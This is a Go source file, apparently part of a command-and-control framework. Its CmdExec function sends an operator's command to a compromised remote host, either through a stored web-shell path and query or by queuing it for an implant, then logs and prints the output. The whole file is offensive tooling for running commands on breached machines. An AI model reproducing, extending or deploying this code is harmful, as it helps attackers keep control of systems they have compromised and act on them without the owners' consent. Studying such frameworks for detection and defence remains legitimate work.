package core

import (
	"errors"
	"strconv"
	"fmt"
)

func CmdExec(activeSession int, cmdString string, operator string) error{

	sessionVal, sessionExists := Sessions.Load(activeSession)
	if !sessionExists {
		return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
	}
	session := sessionVal.(Session)

	if session.CommandQuery != "" {
		data, err := ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, "", "")
		if err != nil {
			return err
		}

		LogData("Session " + strconv.Itoa(activeSession) + " returned:\n" + data)
		if operator == "server" {
			fmt.Println("\nSession " + strconv.Itoa(activeSession) + " returned:\n" + data)
		}
	} else {
		QueueImplantCommand(activeSession, cmdString, "server")
	}

	return nil
}